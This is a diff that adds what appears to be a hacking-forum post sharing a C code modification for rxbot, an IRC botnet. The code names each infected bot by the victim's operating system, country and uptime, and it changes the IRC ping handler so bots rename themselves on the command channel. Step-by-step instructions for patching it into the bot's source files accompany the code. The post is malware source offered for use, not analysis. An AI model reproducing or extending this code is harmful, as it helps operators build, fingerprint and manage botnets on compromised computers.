@@ -1,0 +1,168 @@
+Well I have been here for awhile and have coded some private stuff that I have yet to release. Well I decided to release some stuff this is the smallest thing I will be releasing but here it is. This is a new type of nick for the rxbot that goes like this. OS|COUNTRY|Computer Uptime|random numbers What is unique about this is that it will update the nick when the computer uptime changes or if you are using nick prefix's it will also update them.
+add this to rndnick.cpp
+Code:
+
+add this part to the rnick[]:
+   {"special", SPECIALNICK, rndspecial}
+
+add these as global variables:
+char prebuf[MAXNICKLEN];
+char postbuf[MAXNICKLEN];
+unsigned int ut;
+
+add this as a function
+char *rndspecial(char *strbuf)
+{
+   char *os="";
+   char temp[10];
+   int i;
+   OSVERSIONINFO verinfo;
+   verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+   GetVersionEx(&verinfo);
+
+   ut=GetTickCount()/86400000;
+
+   srand(GetTickCount());
+
+   if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
+      if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
+      if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
+   }
+   else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
+   else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
+   else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
+   else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
+   else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "K3";
+   else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) os = "VS";
+   else os = "UN";
+
+   GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
+   _snprintf(strbuf,MAXNICKLEN,"%s|%s|%.3d", os, temp, ut);
+   _snprintf(prebuf,MAXNICKLEN,"%s|%s|", os, temp);
+   memset(postbuf,0,sizeof(postbuf));
+   postbuf[0]='|';
+   
+   for (i=0;i < maxrand;i++)
+      _snprintf(postbuf, MAXNICKLEN, "%s%i", postbuf, rand()%10);
+
+   _snprintf(strbuf, MAXNICKLEN, "%s%s", strbuf, postbuf);
+   
+   return (strbuf);
+}
+
+and change the prefixnick function to this:
+char *prefixnick(char *strbuf)
+{
+   char tmpbuf[MAXNICKLEN];
+   strcpy(tmpbuf, "");
+   #ifndef NO_MIRCNICK
+   if(fFindWindow("mIRC",0))
+   {
+      mircrunning = TRUE;
+      sprintf(tmpbuf, "[M]");
+   }
+   else
+   {
+      mircrunning = FALSE;
+   }
+
+   if (strlen(tmpbuf) > 2) {
+      strncat(tmpbuf, strbuf, sizeof(tmpbuf));
+      strncpy(strbuf, tmpbuf, MAXNICKLEN);
+   }
+   #endif
+   return (strbuf);
+};
+
+//notes I shortend vista to VS and if you want to add any more prefixes be my guest i just changed it so only mirc is the only prefix
+
+
+add this to rndnick.h
+Code:
+
+add this to the enum:
+SPECIALNICK
+
+and add:
+char *rndspecial(char *strbuf);
+
+
+add this to the externs.h
+Code:
+
+extern BOOL mircrunning;
+extern char prebuf[MAXNICKLEN];
+extern char postbuf[MAXNICKLEN];
+extern unsigned int ut;
+
+
+add this to globals.h
+Code:
+
+BOOL mircrunning = FALSE;
+
+
+and finally rxbot.cpp
+Code:
+
+find the server ping/pong and change it to this
+// pong if we get a ping request from the server
+   if (strcmp("PING", a[0]) == 0) {
+      a[0][1]='O';
+
+      //irc_sendv(sock, "PONG %s\r\n", a[1]+1);
+      irc_sendv(sock, "PONG %s\r\n", a[1]);
+      if (*in_channel == 0)
+         irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
+      //check the uptime and nick to see if we need to change
+      if (nicktype==SPECIALNICK)
+      {
+         sprintf(sendbuf, "");
+         if((GetTickCount()/86400000)>ut)
+         {
+            ut=GetTickCount()/86400000;
+            if(nickprefix)
+            {
+               #ifndef NO_MIRCNICK
+               if(fFindWindow("mIRC",0))
+               {
+                  sprintf(sendbuf,"[M]");
+                  mircrunning=true;
+               }
+               #endif
+            }
+            sprintf(sendbuf, "%s%s%.03d%s", sendbuf, prebuf, ut, postbuf);
+            irc_sendv(sock, "NICK %s\r\n", sendbuf);
+            return 1;
+         }
+         #ifndef NO_MIRCNICK
+         if(nickprefix)
+         {
+            if(fFindWindow("mIRC",0))
+            {
+               if(!mircrunning)
+               {
+                  sprintf(sendbuf, "[M]%s%.03d%s", prebuf, ut, postbuf);
+                  irc_sendv(sock, "NICK %s\r\n", sendbuf);
+                  mircrunning=true;
+               }
+            }
+            else
+            {
+               if(mircrunning)
+               {
+                  sprintf(sendbuf, "%s%.03d%s", prebuf, ut, postbuf);
+                  irc_sendv(sock, "NICK %s\r\n", sendbuf);
+                  mircrunning=false;
+               }
+            }
+         }
+         #endif
+      }
+
+      return 1;
+   }
+
+
+
+and finally change your nicktype to SPECIALNICK in the config.h file 
